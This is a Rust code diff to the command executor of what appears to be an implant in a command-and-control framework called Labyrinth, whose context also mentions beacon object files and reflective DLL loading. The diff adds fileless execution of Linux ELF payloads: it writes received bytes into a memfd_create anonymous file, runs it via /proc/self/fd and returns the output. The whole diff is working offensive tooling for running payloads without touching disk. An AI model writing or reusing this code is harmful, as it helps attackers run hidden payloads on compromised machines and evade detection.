@@ -5,6 +5,9 @@ use std::fs;
 use std::process::Command;
 use std::time::{SystemTime, UNIX_EPOCH};
 
+#[cfg(target_os = "linux")]
+use std::{ffi::CString, io::Write, os::fd::FromRawFd};
+
 #[cfg(target_os = "windows")]
 use std::ptr;
 #[cfg(target_os = "windows")]
@@ -43,6 +46,11 @@ struct CommandResult {
 
 const MAX_LINES: usize = 80;
 const MAX_CHARS: usize = 8000;
+
+#[cfg(target_os = "linux")]
+fn split_execution_args(args: &str) -> Vec<String> {
+    args.split_whitespace().map(str::to_string).collect()
+}
 
 impl CommandExecutor {
     pub fn new(os: &OperatingSystem) -> Self {
@@ -88,6 +96,18 @@ impl CommandExecutor {
         }
     }
 
+    pub async fn execute_linux_elf(&self, elf_data: Vec<u8>, args: &str) -> Result<String> {
+        match self {
+            Self::Linux => self.execute_linux_elf_memfd(elf_data, args).await,
+            Self::Windows => Err(LabyrinthError::Message(
+                "Linux ELF execution is not supported on Windows targets".to_string(),
+            )),
+            Self::Unknown => Err(LabyrinthError::Message(
+                "Linux ELF execution not supported on this operating system".to_string(),
+            )),
+        }
+    }
+
     async fn execute_linux_bof(
         &self,
         _bof_data: Vec<u8>,
@@ -104,6 +124,63 @@ impl CommandExecutor {
             "Reflective PE/DLL loading is not supported on Linux. Windows target required."
                 .to_string(),
         ))
+    }
+
+    async fn execute_linux_elf_memfd(&self, elf_data: Vec<u8>, args: &str) -> Result<String> {
+        #[cfg(target_os = "linux")]
+        {
+            if !elf_data.starts_with(b"\x7FELF") {
+                return Err(LabyrinthError::Message(
+                    "Invalid Linux ELF: missing ELF magic".to_string(),
+                ));
+            }
+
+            let fd_name = CString::new("labyrinth-linux-elf")
+                .map_err(|e| LabyrinthError::Message(format!("Invalid memfd name: {}", e)))?;
+            let fd = unsafe { libc::syscall(libc::SYS_memfd_create, fd_name.as_ptr(), 0) };
+            if fd < 0 {
+                return Err(LabyrinthError::Io(std::io::Error::last_os_error()));
+            }
+
+            let mut file = unsafe { fs::File::from_raw_fd(fd as i32) };
+            file.write_all(&elf_data).map_err(LabyrinthError::Io)?;
+            file.flush().map_err(LabyrinthError::Io)?;
+
+            let memfd_path = format!("/proc/self/fd/{}", fd);
+            let output = Command::new(&memfd_path)
+                .args(split_execution_args(args))
+                .output()
+                .map_err(|e| {
+                    LabyrinthError::Message(format!("Failed to execute memfd ELF: {}", e))
+                })?;
+
+            let exit = output
+                .status
+                .code()
+                .map(|code| code.to_string())
+                .unwrap_or_else(|| "terminated by signal".to_string());
+            let stdout = String::from_utf8_lossy(&output.stdout);
+            let stderr = String::from_utf8_lossy(&output.stderr);
+
+            let mut result = format!("Linux ELF executed from memfd. Exit: {}", exit);
+            if !stdout.trim().is_empty() {
+                result.push_str("\n\nstdout:\n");
+                result.push_str(stdout.trim_end());
+            }
+            if !stderr.trim().is_empty() {
+                result.push_str("\n\nstderr:\n");
+                result.push_str(stderr.trim_end());
+            }
+            Ok(result)
+        }
+
+        #[cfg(not(target_os = "linux"))]
+        {
+            let _ = (elf_data, args);
+            Err(LabyrinthError::Message(
+                "Not supported on this OS".to_string(),
+            ))
+        }
     }
 
     async fn execute_windows_bof(
